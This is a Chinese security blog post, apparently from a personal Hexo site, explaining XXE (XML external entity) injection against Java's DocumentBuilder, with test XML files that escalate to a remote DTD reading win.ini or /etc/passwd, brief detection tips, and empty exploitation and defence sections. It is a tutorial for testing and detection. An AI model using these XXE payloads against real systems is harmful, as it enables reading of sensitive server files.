@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="何为DocumentBuilderDocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。 常规用法Demo先定义一个user.xml，用于让DocumentB">
+<meta name="keywords" content="Java安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML注入之DocumentBuilder">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="何为DocumentBuilderDocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。 常规用法Demo先定义一个user.xml，用于让DocumentB">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/3.png">
+<meta property="og:updated_time" content="2019-02-13T15:32:42.053Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XML注入之DocumentBuilder">
+<meta name="twitter:description" content="何为DocumentBuilderDocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。 常规用法Demo先定义一个user.xml，用于让DocumentB">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>XML注入之DocumentBuilder</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/categories/">目录</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">朝花夕拾</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/02/09/ELF安全防御机制小结/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&text=XML注入之DocumentBuilder"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&is_video=false&description=XML注入之DocumentBuilder"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XML注入之DocumentBuilder&body=Check out this article: https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&name=XML注入之DocumentBuilder&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#何为DocumentBuilder"><span class="toc-number">1.</span> <span class="toc-text">何为DocumentBuilder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常规用法Demo"><span class="toc-number">2.</span> <span class="toc-text">常规用法Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML注入"><span class="toc-number">3.</span> <span class="toc-text">XML注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、测试是否支持解析DTD："><span class="toc-number">3.1.</span> <span class="toc-text">1、测试是否支持解析DTD：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、测试是否支持解析普通实体："><span class="toc-number">3.2.</span> <span class="toc-text">2、测试是否支持解析普通实体：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、测试是否支持解析参数实体："><span class="toc-number">3.3.</span> <span class="toc-text">3、测试是否支持解析参数实体：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、测试是否支持解析外部实体："><span class="toc-number">3.4.</span> <span class="toc-text">4、测试是否支持解析外部实体：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进一步利用"><span class="toc-number">4.</span> <span class="toc-text">进一步利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法"><span class="toc-number">5.</span> <span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-number">6.</span> <span class="toc-text">防御方法</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XML注入之DocumentBuilder
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Mi1k7ea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-02-13T14:19:12.000Z" itemprop="datePublished">2019-02-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Java安全/">Java安全</a>
+    </div>
+    <div class="article-tag">
+        <i class="fas fa-eye"></i>
+        阅读量：<span id="busuanzi_value_page_pv"></span>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="何为DocumentBuilder"><a href="#何为DocumentBuilder" class="headerlink" title="何为DocumentBuilder"></a>何为DocumentBuilder</h2><p>DocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。</p>
+<h2 id="常规用法Demo"><a href="#常规用法Demo" class="headerlink" title="常规用法Demo"></a>常规用法Demo</h2><p>先定义一个user.xml，用于让DocumentBuilder来解析：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sex</span>&gt;</span>male<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>解析代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"user.xml"</span>);</span><br><span class="line">        documentBuilder(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">documentBuilder</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">        DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilder builder=factory.newDocumentBuilder();</span><br><span class="line">            <span class="comment">//解析xml文档，先获取</span></span><br><span class="line">            Document doc=builder.parse(f);</span><br><span class="line">            <span class="comment">//通过user名字来获取dom节点</span></span><br><span class="line">            NodeList nodeList=doc.getElementsByTagName(<span class="string">"user"</span>);</span><br><span class="line">            Element e=(Element)nodeList.item(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">//获取值</span></span><br><span class="line">            System.out.println(<span class="string">"姓名："</span>+e.getElementsByTagName(<span class="string">"name"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"性别："</span>+e.getElementsByTagName(<span class="string">"sex"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"年龄："</span>+e.getElementsByTagName(<span class="string">"age"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行后，发现成功解析了user.xml的内容：</p>
+<p><img src="/2019/02/13/XML注入之DocumentBuilder/1.png" alt="demo"></p>
+<h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><h3 id="1、测试是否支持解析DTD："><a href="#1、测试是否支持解析DTD：" class="headerlink" title="1、测试是否支持解析DTD："></a>1、测试是否支持解析DTD：</h3><p>创建test.xml，内容如下，主要添加了DTD即DOCTYPE：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p>测试代码中将user.xml改为test.xml。</p>
+<p>运行代码，效果和Demo一样，即说明支持解析DTD。</p>
+<p>这里注意一点，当进行的是黑盒测试时，未返回Error不代表就是可以解析XML，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装。</p>
+<h3 id="2、测试是否支持解析普通实体："><a href="#2、测试是否支持解析普通实体：" class="headerlink" title="2、测试是否支持解析普通实体："></a>2、测试是否支持解析普通实体：</h3><p>修改test.xml内容如下，主要添加ELEMENT：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ELEMENT foo EMPTY&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p>发现可以正常解析。</p>
+<h3 id="3、测试是否支持解析参数实体："><a href="#3、测试是否支持解析参数实体：" class="headerlink" title="3、测试是否支持解析参数实体："></a>3、测试是否支持解析参数实体：</h3><p>修改test.xml内容如下，主要修改ELEMENT为ENTITY实体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;&amp;foo;&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p>运行代码，发现可正常解析，且成功进行了XML实体注入：</p>
+<p><img src="/2019/02/13/XML注入之DocumentBuilder/2.png" alt="demo"></p>
+<h3 id="4、测试是否支持解析外部实体："><a href="#4、测试是否支持解析外部实体：" class="headerlink" title="4、测试是否支持解析外部实体："></a>4、测试是否支持解析外部实体：</h3><p>修改test.xml内容如下，主要修改为SYSTEM执行访问外部链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://127.0.0.1/Mi1k7ea.dtd&quot;&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;&amp;tea;&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p>在攻击者的服务器（这里自己开启一个Web服务）的Web目录放置一个Mi1k7ea.dtd文件，内容如下，其中e:/secret.ini为本地的一个敏感文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY tea SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>当然在Linux系统可以将双引号内的内容改为”file:///etc/passwd”来读取passwd文件内容。</p>
+<p>运行代码，发现成功通过远程加载解析DTD文件读取了本地文件内容：</p>
+<p><img src="/2019/02/13/XML注入之DocumentBuilder/3.png" alt="demo"></p>
+<p>当然，外部实体还有另一种写法，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY % milk SYSTEM &quot;http://127.0.0.1/Mi1k7ea.dtd&quot;&gt;</span><br><span class="line">        %milk;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;&amp;tea;&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p>运行结果和上面是一样的。</p>
+<h2 id="进一步利用"><a href="#进一步利用" class="headerlink" title="进一步利用"></a>进一步利用</h2><p>…</p>
+<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>1、在Java项目中搜索javax.xml.parsers下的DocumentBuilderFactory和DocumentBuilder，排查是否使用了该API解析XML文档内容；</p>
+<p>2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能。</p>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>…</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/categories/">目录</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">朝花夕拾</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#何为DocumentBuilder"><span class="toc-number">1.</span> <span class="toc-text">何为DocumentBuilder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常规用法Demo"><span class="toc-number">2.</span> <span class="toc-text">常规用法Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML注入"><span class="toc-number">3.</span> <span class="toc-text">XML注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、测试是否支持解析DTD："><span class="toc-number">3.1.</span> <span class="toc-text">1、测试是否支持解析DTD：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、测试是否支持解析普通实体："><span class="toc-number">3.2.</span> <span class="toc-text">2、测试是否支持解析普通实体：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、测试是否支持解析参数实体："><span class="toc-number">3.3.</span> <span class="toc-text">3、测试是否支持解析参数实体：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、测试是否支持解析外部实体："><span class="toc-number">3.4.</span> <span class="toc-text">4、测试是否支持解析外部实体：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进一步利用"><span class="toc-number">4.</span> <span class="toc-text">进一步利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法"><span class="toc-number">5.</span> <span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-number">6.</span> <span class="toc-text">防御方法</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&text=XML注入之DocumentBuilder"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&is_video=false&description=XML注入之DocumentBuilder"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XML注入之DocumentBuilder&body=Check out this article: https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&title=XML注入之DocumentBuilder"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/02/13/XML注入之DocumentBuilder/&name=XML注入之DocumentBuilder&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Mi1k7ea
+  </div>
+  <span id="busuanzi_container_site_pv"> 
+    <i class="fas fa-eye"></i>
+    访客：<span id="busuanzi_value_site_uv"></span>
+  </span>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/categories/">目录</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">朝花夕拾</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
